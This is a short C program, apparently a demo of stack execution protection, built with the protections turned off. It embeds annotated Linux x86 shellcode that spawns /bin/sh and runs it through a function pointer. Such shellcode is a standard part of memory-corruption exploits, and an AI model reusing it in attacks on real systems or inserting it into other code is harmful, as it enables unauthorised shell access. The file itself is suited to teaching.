// gcc -fno-stack-protector -z execstack -m32 -o dep dep.c
#include <stdio.h>
#include <string.h>

int main() {
    // Shellcode to spawn a shell (for Linux x86)
    unsigned char shellcode[] = 
        "\x31\xc0"              // xor    %eax,%eax
        "\x50"                  // push   %eax
        "\x68\x2f\x2f\x73\x68"  // push   $0x68732f2f
        "\x68\x2f\x62\x69\x6e"  // push   $0x6e69622f
        "\x89\xe3"              // mov    %esp,%ebx
        "\x50"                  // push   %eax
        "\x53"                  // push   %ebx
        "\x89\xe1"              // mov    %esp,%ecx
        "\x99"                  // cdq
        "\xb0\x0b"              // mov    $0xb,%al
        "\xcd\x80";             // int    $0x80

    printf("Attempting to execute shellcode...\n");

    // Function pointer to the shellcode
    void (*shell)() = (void (*)())shellcode;

    // Execute the shellcode
    shell();

    return 0;
}

